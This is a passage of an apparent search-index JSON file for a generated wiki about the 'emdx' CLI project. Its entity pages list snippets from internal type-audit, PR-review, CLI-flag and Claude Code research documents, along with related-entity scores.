Exit Condition on Process Zombie","text":"<p>File: <code>cascade_service.py:97-146</code> Issue: <code>monitor_execution_completion()</code> polls forever if log file never contains result AND process is not detected as zombie.</p>"},{"location":"entities/cascadeservicepy/#related-entities","title":"Related Entities","text":"<ul> <li><code>tag_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.0)</li> <li><code>cli_executor/base.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>update_execution_status</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>procresult</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>file_watcher.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.8)</li> <li><code>execution_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.7)</li> <li><code>cli_executor/factory.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>cli_executor/claude.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>health_monitor.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=5.4)</li> <li><code>duplicate_detector.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.3)</li> </ul>"},{"location":"entities/cascadeviewpy/","title":"cascade_view.py","text":"<p>Type: tech_term | Mentioned in: 12 documents | First seen: 2026-02-13</p>"},{"location":"entities/cascadeviewpy/#documents-12","title":"Documents (12)","text":"<ul> <li> <p>#6515 Any removal Phase 2: UI TypedDicts   Section: 1. Created <code>emdx/ui/types.py</code></p> <ul> <li><code>PipelineActivityDict</code>: Pipeline activity data used in <code>cascade_view.py</code>. Fields include <code>exec_id</code>, <code>input_id</code>, <code>input_title</code>, <code>output_id</code>, <code>output_title</code>, <code>output_stage</code>, <code>from_stage</code>, <code>status</code>, <code>started_at</code>, <code>completed_at</code>, <code>log_file</code>,...</li> </ul> </li> <li> <p>#6512 None Type Analysis [synthesis]   Section: Key Findings</p> <p>Files affected:</p> </li> <li><code>cascade_view.py</code> \u2014 <code>summary</code>, <code>doc_list</code>, <code>pipeline_table</code> (lines 91-93)</li> <li><code>cascade_browser.py</code> \u2014 <code>cascade_view</code> (line 48)</li> <li> <p><code>browser_container.py</code> \u2014 <code>container_widget</code> (line 86)</p> </li> <li> <p>#6510 None Type Analysis [7/7]   Section: High Confidence \u2014 Widget State Attributes (Set in <code>compose()</code>)</p> <ol> <li><code>cascade_view.py</code>:</li> </ol> </li> <li><code>self.summary: StageSummaryBar | None</code> \u2192 <code>StageSummaryBar</code> (assign sentinel)</li> <li><code>self.doc_list: DocumentList | None</code> \u2192 <code>DocumentList</code></li> <li> <p><code>self.pipeline_table: DataTable[str] | None</code> \u2192 <code>DataTable[str]</code></p> </li> <li> <p>#6509 Any Type Removal Analysis [synthesis]   Section: Implementation Strategy</p> <p>...s (2-3 hours)</p> </li> <li>Update <code>activity_items.py</code> to use <code>DocumentDBProtocol</code></li> <li>Update <code>cascade_view.py</code> to use <code>ExecutionData</code></li> <li>Update services to use proper optional dependency types</li> <li> <p>Update command palette to use <code>PaletteAction</code></p> </li> <li> <p>#6508 Any Type Removal Analysis [synthesis]   Section: Files by Priority</p> <p>...------|-----------|-----------| | High | <code>activity_items.py</code> | 15 | 15 | | High | <code>cascade_view.py</code> | 12 | 12 | | High | <code>unified_search.py</code> | 5 | 5 | | High | <code>ask_service.py</code> | 6 | 6 | | Medium | <code>compact.py</code> | 7 | 5 | | Medium | <code>distill.py</code> | 5 | 4 | | Medium...</p> </li> <li> <p>#6491 Any Type Removal Analysis [1/5]   Section: Recommendations Summary</p> <p>...-|-----------|----------| | <code>activity_items.py</code> | 15 | High \u2014 core data types | | <code>cascade_view.py</code> | 12 | High \u2014 multiple timer/stream types | | <code>activity_view.py</code> | 2 | Low \u2014 just init | | <code>group_picker.py</code> | 4 | Medium \u2014 group dict types | | `stage_summary_...</p> </li> <li> <p>#6488 Any Type Removal Analysis [1/5]   Section: Summary</p> <p>...h concrete types | | <code>group_picker.py</code> | 3 | Replace with concrete dict types | | <code>cascade_view.py</code> | 12 | Replace with protocol/concrete types | | <code>stage_summary_bar.py</code> | 1 | Replace with kwargs type | | <code>document_list.py</code> | 1 | Replace with kwargs type |</p> </li> <li> <p>#6417 Type System Audit: Replace Any/None with Concrete Types [4/4]   Section: 4. Cascade View Timers/Streams \u2014 <code>_auto_refresh_timer: Any</code>, <code>_log_stream: Any</code>, etc.</p> <p>Location: <code>emdx/ui/cascade/cascade_view.py:97-100</code></p> </li> <li> <p>#6157 Delegate: Check if the legacy cascade wrapper functions in emdx/databa [2/5]   Section: Production Code (NO imports from documents.py)</p> <p>...: imports <code>get_document_pr_url</code>, <code>list_documents_at_stage</code> from cascade_service</p> </li> <li><code>cascade_view.py</code>: imports <code>list_documents_at_stage</code>, <code>save_document_to_cascade</code> from cascade_service</li> <li> <p><code>stage_summary_bar.py</code>: imports <code>get_cascade_stats</code> from cascade_service</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: Minor Observations (2)</p> <ol> <li>cascade_view.py:100 \u2014 <code>_selected_exec: dict | None</code> could use empty dict, but None is semantically clearer. Keep as-is.</li> </ol> </li> <li> <p>#6300 Delegate: DEBT-27: Add async test coverage for UI components. The audi   Section: DEBT-27: Add Async Test Coverage for UI Components</p> <p>...ocuments, pagination, search, expand/collapse, CRUD operations, tag management</p> </li> <li>cascade_view.py (3 tests): initialization, stage navigation, view mode switching  </li> <li>document_list.py (3 tests): multi-select functionality</li> <li> <p>viewmodels (4 tests): Documen...</p> </li> <li> <p>#6259 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [17/37]   Section: Changes Made</p> <p>...ctivity_view.py**: Selected item query and markdown rendering fallbacks logged</p> </li> <li>cascade_view.py: Timestamp formatting and widget query failures logged</li> <li>command_palette/palette_screen.py: Debug log file write failures logged</li> <li>document_browser.py: Sta...</li> </ul>"},{"location":"entities/cascadeviewpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/ui/types.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.1)</li> <li><code>document_list.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.1)</li> <li><code>stage_summary_bar.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.1)</li> <li><code>cascaderundict</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.1)</li> <li><code>pipelineactivitydict</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>pipeline_name</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>pipeline_display_name</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>initial_doc_title</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>grouplistitem</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>cascade_browser.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> </ul>"},{"location":"entities/cat/","title":"--cat","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-02-16</p>"},{"location":"entities/cat/#documents-10","title":"Documents (10)","text":"<ul> <li> <p>#6863 Delegate: Audit docs/ folder: Read docs/cli-api.md, docs/architecture. [3/3]   Section: docs/cli-api.md</p> <p>12. MISSING: <code>emdx task list</code> flags not documented (line 1028-1033) <code>emdx task list</code> has <code>--status</code>, <code>--all</code>, <code>--done</code>, <code>--limit</code>, <code>--epic</code>, <code>--cat</code>, <code>--json</code> flags. The doc just shows the bare command.</p> </li> <li> <p>#6825 Delegate: --help [2/2]   Section: Options</p> <p>...(default: main) | | <code>--epic</code> | <code>-e</code> | INTEGER | Epic task ID to add tasks to | | <code>--cat</code> | <code>-c</code> | TEXT | Category key for auto-numbered tasks | | <code>--cleanup</code> | \u2014 | \u2014 | Remove stale delegate worktrees (&gt;1 hour old) | | <code>--json</code> | \u2014 | \u2014 | Output structure...</p> </li> <li> <p>#6810 Delegate: Fix DOC-6: Update docs/cli-api.md with new task commands fro [1/5]   Section: Summary</p> <ol> <li>KEY-N display ID format \u2014 New \"Display IDs\" section explaining that categorized tasks show <code>FEAT-12</code> / <code>SEC-3</code> style IDs, auto-assigned via <code>--cat</code>, usable as identifiers in all task commands.</li> </ol> </li> <li> <p>#6789 Delegate: --help [2/2]</p> <p>...raft<code>,</code>--worktree<code>,</code>--base-branch<code>) are grouped under \"Git &amp; PRs\", and</code>--epic<code>/</code>--cat` under \"Organization\"</p> </li> <li> <p>Concise option descriptions \u2014 Trimmed verbose help strings (e.g. \"Use Sonnet model (shortcut for --model sonnet)\" \u2192 \"Use Sonnet model\")...</p> </li> <li> <p>#6788 Delegate: --help [2/2]</p> <p>...-worktree<code>,</code>--base-branch<code>) are under \"Git &amp; PRs\"; organization flags (</code>--epic<code>,</code>--cat`) are under \"Organization\"</p> </li> <li> <p>Concise help strings \u2014 Every option description was tightened (e.g. \"Use Sonnet model (shortcut for --model sonnet)\" \u2192 \"Use Sonnet...</p> </li> <li> <p>#6787 Delegate: list [1/2]</p> <p>...worktree<code>,</code>--base-branch`</p> </li> <li>Added <code>rich_help_panel=\"Organization\"</code> for <code>--epic</code>, <code>--cat</code></li> <li> <p>Tightened all option help strings to be more concise</p> </li> <li> <p>#6785 Delegate: --help [2/2]   Section: Changes</p> <p>...<code>--draft</code>, <code>--worktree</code>, <code>--base-branch</code></p> </li> <li>\"Organization\" panel: <code>--epic</code>, <code>--cat</code></li> <li>Improved option descriptions \u2014 cleaner, more concise text (e.g. \"Inject document content as context\" instead of \"Document ID to use as input context\")</li> <li> <p>**Fix...</p> </li> <li> <p>#6678 Delegate Slimming Research [1/3]   Section: (B) MUST STAY IN LAUNCHER \u2014 Hooks can't do these</p> <p>...back: <code>--pr</code>, <code>--branch</code>, <code>--model</code>, <code>--tags</code>, <code>--synthesize</code>, <code>--doc</code>, <code>--epic</code>, <code>--cat</code>, <code>--worktree</code>, <code>--draft</code>, <code>--jobs</code>, <code>--cleanup</code>, mutual exclusivity checks. This is the entry point \u2014 hooks have no CLI. | | 2 | **Parallel orchestration (ThreadPoo...</p> </li> <li> <p>#6606 Delegate: Update CLAUDE.md to reflect that 'emdx epic' and 'emdx cat'    Section: Analysis</p> <p>The <code>--epic</code> and <code>--cat</code> flags on <code>emdx task add</code> (line 112, 203) are correct as-is \u2014 they're flags, not standalone commands.</p> </li> <li> <p>#6564 Delegate: Analyze the emdx delegate command implementation in emdx/com [1/3]   Section: Epic/Category Integration</p> Flag Short Description <code>--epic</code> <code>-e</code> Epic task ID to add tasks to <code>--cat</code> <code>-c</code> Category key for auto-numbered tasks </li> </ul>"},{"location":"entities/cat/#related-entities","title":"Related Entities","text":"<ul> <li><code>--jobs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.4)</li> <li><code>grouped option panels</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>emdx task epic list</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>--flags</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>--epic</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (9 shared docs, PMI=6.3)</li> <li><code>--base-branch</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=6.2)</li> <li><code>--branch</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=6.0)</li> <li><code>use sonnet</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>--cleanup</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>_delegate_help</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> </ul>"},{"location":"entities/categoriespy/","title":"categories.py","text":"<p>Type: heading | Mentioned in: 7 documents | First seen: 2026-02-15</p>"},{"location":"entities/categoriespy/#documents-7","title":"Documents (7)","text":"<ul> <li>#6503 None Type Analysis [2/7]   Section: File-by-File Analysis </li> <li><code>description: str | None = typer.Option(None, ...)</code> - Legitimate: optional description</li> <li> <p><code>name: str | None = typer.Option(None, ...)</code> - Legitimate: optional name</p> </li> <li> <p>#6416 Type System Audit: Replace Any/None with Concrete Types [1/4]</p> <p>Found 15 functions that could benefit from TypedDict or dataclass replacements. ---</p> </li> </ul>"},{"location":"entities/categoriespy/#categoriespy_1","title":"categories.py","text":""},{"location":"entities/categoriespy/#categoriespy_2","title":"categories.py","text":""},{"location":"entities/categoriespy/#1-get_categorykey-str-dictstr-any-none","title":"1. <code>get_category(key: str) -&gt; dict[str, Any] | None</code>","text":"<p>Location: Line 27 Current: Returns <code>SELECT * FROM categories</code> as dict *Keys:...</p> <ul> <li>#6433 Any/None typing audit [2/5]   Section: Files with NO Any usage <ul> <li><code>documents.py</code> - Re-exports only, no function definitions</li> </ul> </li> <li><code>categories.py</code> - Uses only concrete types and cast()</li> <li><code>types.py</code> - TypedDict definitions only</li> <li> <p><code>__init__.py</code> - Re-exports only</p> </li> <li> <p>#6428 Add TaskDict TypedDicts to models layer   Section: Add TypedDict definitions to models layer</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...**: All necessary</p> </li> <li>review.py: All necessary</li> <li>prime.py: All necessary</li> <li>categories.py: All necessary</li> <li>browse.py: All necessary</li> <li>briefing.py: 1 bug to fix</li> <li>compact.py: All necessary</li> <li> <p>executions.py: 1 special case (tri-state bool)</p> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: 1. Commands Analysis by LOC and Value</p> <p>...| | epics.py | 147 | THIN - Epic management. Just wraps task system. | | categories.py | 97 | THIN - Category management. Just wraps task system. | | trash.py | 205 | SUPPORT - Trash management. Necessary but simple. | | ask.py | 330...</p> </li> <li> <p>#6372 Codebase Bug Audit 2026-02-15 [4/10]</p> </li> </ul>"},{"location":"entities/categoriespy/#summary","title":"Summary","text":"<p>Created <code>emdx/models/types.py</code> with TypedDict definitions and updated return type annotations in <code>tasks.py</code>, <code>categories.py</code>, and <code>tags.py</code>.</p>"},{"location":"entities/categoriespy/#emdx-models-bug-audit-report","title":"EMDX Models Bug Audit Report","text":"<p>Date: 2026-02-15 Scope: emdx/models/ directory (documents.py, tags.py, tasks.py, categories.py, executions.py)</p>"},{"location":"entities/categoriespy/#related-entities","title":"Related Entities","text":"<ul> <li><code>epics.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.9)</li> <li><code>categorywithstatsdict</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.9)</li> <li><code>briefing.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>activedelegatetaskdict</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>ask.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.2)</li> <li><code>tagstatsdict</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>tagsearchresultdict</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>review.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>epictaskdict</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>categorydict</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> </ul>"},{"location":"entities/changes/","title":"changes:","text":"<p>Type: concept | Mentioned in: 10 documents | First seen: 2026-02-15</p>"},{"location":"entities/changes/#documents-10","title":"Documents (10)","text":"<ul> <li>#6858 Delegate: FEAT-31 (Issue #1243): Add wiki topic rename command. Add 'e [2/4]   Section: Summary <p>Changes:</p> </li> <li><code>emdx/commands/maintain.py</code> \u2014 Added <code>wiki_rename</code> command to <code>wiki_app</code> that:</li> <li>Looks up the topic by ID, rejecting if not found</li> <li> <p>Auto-generates slug fr...</p> </li> <li> <p>#6849 Delegate: FIX-5: In emdx/commands/delegate.py _run_parallel(), around  [2/4]   Section: Summary</p> <p>Changes:</p> </li> <li><code>emdx/commands/delegate.py:1011</code> \u2014 Added <code>limit=limit</code> to the synthesis <code>_run_single</code> call</li> <li> <p><code>tests/test_delegate_commands.py</code> \u2014 Added `test_parallel_s...</p> </li> <li> <p>#6843 Delegate: Fold the stale top-level command into maintain. Move stale l</p> <p>Changes:</p> </li> <li><code>emdx/main.py</code> \u2014 Removed the <code>stale_app</code> import and top-level <code>app.add_typer(stale_app, ...)</code> registration</li> <li> <p><code>emdx/commands/maintain.py</code> \u2014 Added `stale_a...</p> </li> <li> <p>#6530 Delegate: Review GitHub PR #651 using 'gh pr view 651' and 'gh pr diff [2/4]   Section: PR #651 Review: Remove cascade system and --chain flag from delegate</p> <p>PR: https://github.com/arockwell/emdx/pull/651 Status: MERGED Author: arockwell Changes: +52 / -5,546 lines</p> </li> <li> <p>#6529 Delegate: Review GitHub PR #652 using 'gh pr view 652' and 'gh pr diff [1/4]   Section: PR #652 Review: Structured Multi-Step Recipes with Frontmatter</p> <p>Status: OPEN Author: arockwell Changes: +1432 / -35 lines</p> </li> <li> <p>#6528 Delegate: Review GitHub PR #650 using 'gh pr view 650' and 'gh pr diff [3/4]   Section: PR #650 Review: Redesign TUI search screen as conversational Q&amp;A</p> <p>PR: https://github.com/arockwell/emdx/pull/650 Author: arockwell Status: MERGED Changes: +777 / -5 lines</p> </li> <li> <p>#6527 Delegate: Review GitHub PR #649 using 'gh pr view 649' and 'gh pr diff [4/4]   Section: PR #649 Review: feat: add --task and --done flags to emdx save</p> <p>Status: MERGED Author: arockwell Changes: +70/-6 lines</p> </li> <li> <p>#6525 Delegate: FEAT-7 Ask-KB Improvements Implementation   Section: Phase 1: Core Filters</p> <p>Changes:</p> </li> <li>Added <code>--tags</code> option to <code>ask</code> and <code>context</code> commands</li> <li>Accepts comma-separated tags (e.g., <code>--tags \"security,active\"</code>)</li> <li> <p>Text aliases auto-expand to emojis (e.g., \"gameplan\" \u2192 \"\ud83c\udfaf\")</p> </li> <li> <p>#6516 Any removal Phase 4: Command/Model TypedDicts   Section: 1. <code>emdx/commands/compact.py</code></p> <p>Changes:</p> </li> <li>Added <code>TYPE_CHECKING</code> guard with numpy imports (<code>np</code>, <code>npt</code>)</li> <li>Created <code>CompactDocumentDict</code> TypedDict for document data:</li> <li> <p><code>id: int</code>, <code>title: str</code>, `content:...</p> </li> <li> <p>#6353 Delegate: Analyze upgrading textual from ^4.0.0 to ^6.2.1 for the emdx [2/2]   Section: 1.3 TextArea Default Changes (v0.48.0)</p> <p>Changes:</p> </li> <li>Default <code>soft_wrap=True</code> (was False)</li> <li>Default <code>show_line_numbers=False</code> (was True)</li> <li>Default <code>tab_behaviour=\"focus\"</code> (was \"indent\")</li> <li>Default theme changed to CSS-based styling</li> </ul>"},{"location":"entities/changes/#related-entities","title":"Related Entities","text":"<ul> <li><code>author:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.4)</li> <li><code>\ud83d\udd0d edge cases</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>new components</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>code quality assessment</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.8)</li> <li><code>\u2705 strengths</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>security considerations</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>clean separation of concerns</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>edge cases</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.2)</li> <li><code>emdx/commands/maintain.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> <li><code>verdict</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.2)</li> </ul>"},{"location":"entities/claude-code/","title":"claude code","text":"<p>Type: heading | Mentioned in: 73 documents | First seen: 2025-07-07</p>"},{"location":"entities/claude-code/#documents-73","title":"Documents (73)","text":"<ul> <li>#6387 Delegate: Research the competitive landscape for AI agent tooling in 2 [1/4]   Section: Sources </li> <li>Claude Code Sub-agents Documentation</li> <li> <p>[Claude Code Tasks Update - VentureBeat](https://venturebeat.com/orchestration...</p> </li> <li> <p>#6669 Prime Command Redesign Research [1/3]</p> <p>Delegate 1/3 is still running. That's the Claude Code deep-dive, but I already have doc #6664 covering that in detail. I have all the data I need. Here's the research summary:</p> </li> <li> <p>#6668 Prime Command Redesign: External Tool Research [synthesis]   Section: 1. Two Competing Paradigms Have Emerged</p> <p>Pre-indexed RAG (Cursor, Continue, Copilot, Windsurf, Augment) vs. Agentic Discovery (Claude Code, and now Continue's new direction).</p> </li> <li> <p>#6667 Prime Command Redesign: External Tool Research [4/4]   Section: Other Notable Tools</p> <p>...BM25 \u2192 embeddings pipeline | Code Search integration, 2500-file local limit | | Claude Code | No pre-indexing \u2014 pure agentic tool use | Only major tool without RAG; relies on Grep/Glob/Read |</p> </li> <li> <p>#6158 Delegate: analysis [5/5]   Section: Integration Points</p> <ul> <li>Claude Code: Designed as primary Claude integration tool</li> </ul> </li> <li>GitHub CLI: <code>gh</code> for PR creation, gists</li> <li>Git: Worktree management, project detection</li> <li> <p>SQLite: Single-file portable database</p> </li> <li> <p>#6862 Delegate: Audit README.md: Read the full README.md and check every CLI [1/3]   Section: Issues Found</p> <p>...x gist` \u2014 GitHub Gist creation from documents</p> </li> <li><code>emdx prime</code> \u2014 Session priming for Claude Code</li> <li><code>emdx trash</code> \u2014 Trash management (list/restore/purge)</li> <li> <p><code>emdx delete</code> \u2014 Document deletion</p> </li> <li> <p>#6853 Delegate: FIX-6: Investigate delegate --pr permission failures (FIX-4/ [4/4]   Section: Root Cause: Space-in-Pattern Parsing Bug</p> <p>When space-joined, <code>Bash(gh pr:*)</code> may get split into <code>Bash(gh</code> + <code>pr:*)</code> by Claude Code's parser, making it an invalid pattern. This means <code>gh pr create</code> is not actually pre-authorized.</p> </li> <li> <p>#6852 FIX-6: Delegate --pr Permission Failures Analysis   Section: Primary Issue: Space in Pattern + Space-Separated Joining</p> <p>Claude Code's <code>--allowedTools</code> flag accepts \"Comma or space-separated\" tool names. If the parser naively splits on spaces, <code>Bash(gh pr:*)</code> becomes <code>Bash(gh</code> + <code>pr:*)</code> \u2014 both invalid patterns.</p> </li> <li> <p>#6757 Delegate: Document #6709 (Design: Unified Dashboard Data Model):</p> </li> </ul>"},{"location":"entities/claude-code/#claude-code_1","title":"Claude Code","text":""},{"location":"entities/claude-code/#un-22","title":"Un [2/2]","text":"<p>I understand the <code>git push</code> command requires explicit user approval in your Claude Code settings. Please approve the push when the permission prompt appears, and then I can create the PR.</p> <ul> <li>#6723 Wiki Generation Architecture Research \u2014 Topic Clustering Algorithms   Section: Entity Type-Aware Naming <ol> <li>Find the cluster's most distinctive proper_noun -&gt; use as primary name</li> </ol> </li> <li>Find the cluster's most distinctive tech_term -&gt; use as qualifier</li> <li> <p>Result: \"Claude Code -- Delegate System\", \"Security -- Authentication Patterns\"</p> </li> <li> <p>#6695 Delegate: Research link scoring and ranking strategies for multi-metho [2/4]   Section: Current State Summary</p> <ol> <li>Relative scoring \u2014 normalizes by max_shared per-document, so a doc that shares only 1 entity with everything still gets 1.0 for its \"best\" match</li> </ol> </li> <li> <p>No entity weighting \u2014 sharing \"Claude Code\" counts the same as sharing \"session\"</p> </li> <li> <p>#6687 Fix emdx delete auto-confirm for non-TTY   Section: To push and create PR:</p> <p>...s (typer.confirm, Confirm.ask) now auto-confirm when stdin is not a TTY</p> </li> <li>Prevents Claude Code agents from hanging on confirmation prompts in 10 command files</li> <li> <p>Added 9 tests for the non-TTY auto-confirm behavior</p> </li> <li> <p>#6680 Delegate Slimming Research [3/3]</p> <p>Here's the complete research on Claude Code's hook system:</p> </li> <li> <p>#6678 Delegate Slimming Research [1/3]   Section: Key Insight: The Circular Dependency Problem</p> <p>...create. This would require either:</p> </li> <li>A PreLaunch hook event (doesn't exist in Claude Code)</li> <li>A two-phase approach: launcher creates task/execution, passes IDs via env, hooks manage lifecycle</li> <li> <p>Which is... exactly what it does today</p> </li> <li> <p>#6670 Prime Command Redesign Research [synthesis]   Section: Core Finding</p> 